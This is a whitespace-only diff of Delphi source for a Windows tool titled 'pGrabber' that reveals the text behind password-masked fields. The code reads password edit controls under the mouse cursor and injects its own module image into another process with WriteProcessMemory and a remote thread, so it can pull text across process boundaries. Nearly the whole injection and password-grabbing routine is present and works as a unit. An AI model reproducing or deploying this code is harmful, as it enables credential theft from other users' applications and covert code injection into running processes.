@@ -24,19 +24,19 @@ Date: 01.01.2007
       windows,
       myfuncs in 'myfuncs.pas';
     const 
-            WM_CREATE           = $0001;
-            WM_DESTROY          = $0002;
-            WM_SETTEXT          = $000C;
-            WM_GETTEXT          = $000D;
-            WM_TIMER            = $0113;
-            WM_GETTEXTLENGTH    = $000E;
-            EM_GETPASSWORDCHAR  = $00D2;
-            WM_COMMAND          = $0111;
+        WM_CREATE           = $0001;
+        WM_DESTROY          = $0002;
+        WM_SETTEXT          = $000C;
+        WM_GETTEXT          = $000D;
+        WM_TIMER            = $0113;
+        WM_GETTEXTLENGTH    = $000E;
+        EM_GETPASSWORDCHAR  = $00D2;
+        WM_COMMAND          = $0111;
     var
-            wc              : TWndClass;
-            hwnd            : THandle;
-            mMsg            : TMsg;
-            ehwnd           : THandle;
+        wc              : TWndClass;
+        hwnd            : THandle;
+        mMsg            : TMsg;
+        ehwnd           : THandle;
      
     function GetTextPODCursor: PChar;
     var grabtext: array[0..125] of char;
@@ -46,11 +46,11 @@ Date: 01.01.2007
        GetCursorPos(lpPoint);
        hwnd := WindowFromPoint(lpPoint);
        if (SendMessage(hwnd, EM_GETPASSWORDCHAR, 0, 0) <> 0) then
-          begin
+       begin
            SendMessage(hwnd, WM_GETTEXT, 20, Integer(PChar(@grabtext)));
            result := PChar(@grabtext);
-          end else
-       result := PChar('');
+       end else
+           result := PChar('');
        SendMessage(ehwnd, WM_SETTEXT, 0, Integer(result));
     end;
      
@@ -79,7 +79,7 @@ Date: 01.01.2007
             end;
      
        end;
-     result:=DefWindowProc(hWnd, lMsg, wParam, lParam);
+       result:=DefWindowProc(hWnd, lMsg, wParam, lParam);
     end;
      
      
@@ -88,7 +88,7 @@ Date: 01.01.2007
     // Main Entry Point //
     //////////////////////
     begin
-     with wc do begin
+      with wc do begin
           style          := CS_HREDRAW or CS_VREDRAW;
           lpfnWndProc    := @WndProc;
           cbClsExtra     := 0;
@@ -99,19 +99,19 @@ Date: 01.01.2007
           hbrBackground  := 26214418;
           lpszMenuName   := nil ;
           lpszClassName  := 'pGClass';
-     end;
+      end;
      
-     RegisterClass(wc);
+      RegisterClass(wc);
      
-     hwnd  := CreateWindow('pGClass','   pGrabber [win98/Xp v2.0]  by xZero',WS_OVERLAPPEDWINDOW and WS_DLGFRAME,400,300,260,65,0,0,hInstance,nil);
-     ehwnd := CreateWindowEx(WS_EX_CLIENTEDGE, 'Edit', '',WS_CHILD or WS_VISIBLE or ES_READONLY, 5, 5, 245, 20, hwnd, 0, hInstance, nil);
+      hwnd  := CreateWindow('pGClass','   pGrabber [win98/Xp v2.0]  by xZero',WS_OVERLAPPEDWINDOW and WS_DLGFRAME,400,300,260,65,0,0,hInstance,nil);
+      ehwnd := CreateWindowEx(WS_EX_CLIENTEDGE, 'Edit', '',WS_CHILD or WS_VISIBLE or ES_READONLY, 5, 5, 245, 20, hwnd, 0, hInstance, nil);
      
-     ShowWindow(hwnd, SW_SHOW);UpdateWindow(hwnd);
+      ShowWindow(hwnd, SW_SHOW);UpdateWindow(hwnd);
      
-     while GetMessage(mMsg, hwnd, 0, 0) do
+      while GetMessage(mMsg, hwnd, 0, 0) do
       begin
-       TranslateMessage(mMsg);
-       DispatchMessage(mMsg);
+        TranslateMessage(mMsg);
+        DispatchMessage(mMsg);
       end;
       Halt(mMsg.wParam);
     end.
@@ -119,10 +119,11 @@ Date: 01.01.2007
     unit myfuncs;
     interface
     uses windows, tlhelp32;
-            function IsNT: boolean;
-            function OPTHDROFFSET(ptr: LongInt): DWORD;
-            function SpawnThreadNT(pszProcess: PChar; g_hModule: HMODULE): boolean;
-            procedure EntryPoint;
+    
+    function IsNT: boolean;
+    function OPTHDROFFSET(ptr: LongInt): DWORD;
+    function SpawnThreadNT(pszProcess: PChar; g_hModule: HMODULE): boolean;
+    procedure EntryPoint;
      
      
     implementation
@@ -138,10 +139,10 @@ Date: 01.01.2007
         osvi.dwOSVersionInfoSize := sizeof(OSVERSIONINFO);
      
         if(not GetVersionEx(osvi))then
-            begin
-                    result := FALSE;
-                    exit;
-            end;
+        begin
+            result := FALSE;
+            exit;
+        end;
      
         if(osvi.dwPlatformId <> VER_PLATFORM_WIN32_NT)then
             result := FALSE
@@ -152,33 +153,33 @@ Date: 01.01.2007
      
     function OPTHDROFFSET(ptr: LongInt): DWORD;
     begin
-            result := PImageOptionalHeader(int64(ptr) + PImageDosHeader(ptr)._lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER)).SizeOfImage;
+        result := PImageOptionalHeader(int64(ptr) + PImageDosHeader(ptr)._lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER)).SizeOfImage;
     end;
      
      
     function SpawnThreadNT(pszProcess: PChar; g_hModule: HMODULE): boolean;
     var
-            dwProcID: DWORD;
-            hToolHelp: THandle;
+        dwProcID: DWORD;
+        hToolHelp: THandle;
         pe: PROCESSENTRY32;
-            hProc: THandle;
-            dwSize: DWORD;
-            pMem: Pointer;
+        hProc: THandle;
+        dwSize: DWORD;
+        pMem: Pointer;
         dwOldProt, dwNumBytes, i: DWORD;
-            mbi: TMemoryBasicInformation;
-            dwRmtThdID: DWORD;
-            hRmtThd: THandle;
+        mbi: TMemoryBasicInformation;
+        dwRmtThdID: DWORD;
+        hRmtThd: THandle;
     begin
         hToolHelp := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         pe.dwSize := sizeof(pe);
      
         if(not Process32First(hToolHelp, pe))then
-            begin
-                    result := false;
-                    exit;
-            end;
+        begin
+            result := false;
+            exit;
+        end;
      
-            dwProcID := 0;
+        dwProcID := 0;
         while(Process32Next(hToolHelp, pe))do
         begin
             if(lstrcmpi(pe.szExeFile, pszProcess) = 0)then
@@ -196,17 +197,17 @@ Date: 01.01.2007
         end;
      
         if(GetCurrentProcessId() = dwProcID)then
-            begin
-                    result := FALSE;
-                    exit;
-            end;
+        begin
+            result := FALSE;
+            exit;
+        end;
      
      
         hProc := OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcID);
         if(hProc = 0)then
         begin
             result := FALSE;
-                    exit;
+            exit;
         end;
      
         VirtualFreeEx(hProc, ptr(g_hModule), 0, MEM_RELEASE);
@@ -217,7 +218,7 @@ Date: 01.01.2007
         if(pMem = nil)then
         begin
             result := FALSE;
-                    exit;
+            exit;
         end;
      
         VirtualQueryEx(hProc, pMem, mbi, sizeof(MEMORY_BASIC_INFORMATION));
@@ -225,23 +226,23 @@ Date: 01.01.2007
             begin
             if((mbi.Protect and PAGE_GUARD) = 0)then
             begin
-                            i := 0;
-                            while(i < mbi.RegionSize)do
+                i := 0;
+                while(i < mbi.RegionSize)do
                 begin
-                        if(not VirtualProtectEx(hProc, ptr(DWORD(pMem) + i), $1000, PAGE_EXECUTE_READWRITE, dwOldProt))then
-                                    begin
-                                            result := FALSE;
-                                            exit;
-                                    end;
+                    if(not VirtualProtectEx(hProc, ptr(DWORD(pMem) + i), $1000, PAGE_EXECUTE_READWRITE, dwOldProt))then
+                    begin
+                        result := FALSE;
+                        exit;
+                    end;
      
                     if(not WriteProcessMemory(hProc, ptr(DWORD(pMem) + i), Pointer(DWORD(g_hModule) + i), $1000, dwNumBytes))then
-                                    begin
-                                            result := FALSE;
-                                            exit;
-                                    end;
-                                    i := i + $1000;
+                    begin
+                        result := FALSE;
+                        exit;
+                    end;
+                    i := i + $1000;
                 end;
-                            pMem := Pointer(DWORD(pMem) + mbi.RegionSize);
+                pMem := Pointer(DWORD(pMem) + mbi.RegionSize);
                 VirtualQueryEx(hProc, pMem, mbi, sizeof(MEMORY_BASIC_INFORMATION));
             end;
         end;
@@ -250,26 +251,26 @@ Date: 01.01.2007
         if(hRmtThd = 0)then
         begin
             result := FALSE;
-                    exit;
+            exit;
         end;
         CloseHandle(hProc);
      
-            result := TRUE;
+        result := TRUE;
     end;
      
      
     procedure EntryPoint;
     var
-            grabtext        : array[0..125] of char;
-            lpPoint         : TPoint;
-            hwnd            : THandle;
+        grabtext        : array[0..125] of char;
+        lpPoint         : TPoint;
+        hwnd            : THandle;
     begin
        GetCursorPos(lpPoint);
        hwnd := WindowFromPoint(lpPoint);
        if (GetParent(hwnd) <> 0)then
        begin
-            SendMessage(hwnd, WM_GETTEXT, 20, Integer(PChar(@grabtext)));
-            SendMessage(FindWindowEx(FindWindow('pGClass', nil), 0, 'Edit', nil), WM_SETTEXT, 0, Integer(PChar(@grabtext)));
+           SendMessage(hwnd, WM_GETTEXT, 20, Integer(PChar(@grabtext)));
+           SendMessage(FindWindowEx(FindWindow('pGClass', nil), 0, 'Edit', nil), WM_SETTEXT, 0, Integer(PChar(@grabtext)));
        end;
     end;
      
